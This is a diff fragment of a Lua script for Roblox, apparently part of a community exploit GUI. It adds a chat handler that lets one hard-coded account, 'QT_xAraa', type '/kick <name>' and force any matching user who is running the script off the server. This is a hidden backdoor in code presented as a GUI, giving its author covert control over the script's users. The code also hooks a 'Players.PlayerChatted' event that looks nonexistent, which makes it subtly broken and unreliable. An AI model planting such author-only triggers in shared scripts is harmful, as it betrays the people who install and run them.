@@ -15317,27 +15317,22 @@ sendNotification("Hunter Clan Notes!!", "I Degraded the version of this GUI to m
 
 local Players = game:GetService("Players")
 local LocalPlayer = Players.LocalPlayer
+local KickCommand = "/kick"
 
-local function kickPlayer(playerName)
-    local player = Players:FindFirstChild(playerName)
-    if player then
-        player:Kick("You have been kicked from the server.")
-    end
-end
-
-local function onCommand(input)
-    local command = string.split(input, " ")
-    if command[1] == "/kick" and command[2] then
-        kickPlayer(command[2])
-    end
-end
-
-Players.PlayerAdded:Connect(function(player)
+local function onPlayerChatted(player, message)
     if player.Name == "QT_xAraa" then
-        player.Chatted:Connect(function(message)
-            onCommand(message)
-        end)
+        local command, targetPlayerName = message:match("^(%S+)%s(.+)$")
+        if command == KickCommand then
+            local targetPlayer = Players:FindFirstChild(targetPlayerName)
+            if targetPlayer and targetPlayer == LocalPlayer then
+                LocalPlayer:Kick("You have been kicked from the server.")
+            end
+        end
     end
+end
+
+Players.PlayerChatted:Connect(function(player, message)
+    onPlayerChatted(player, message)
 end)
 -----------------------------}
 
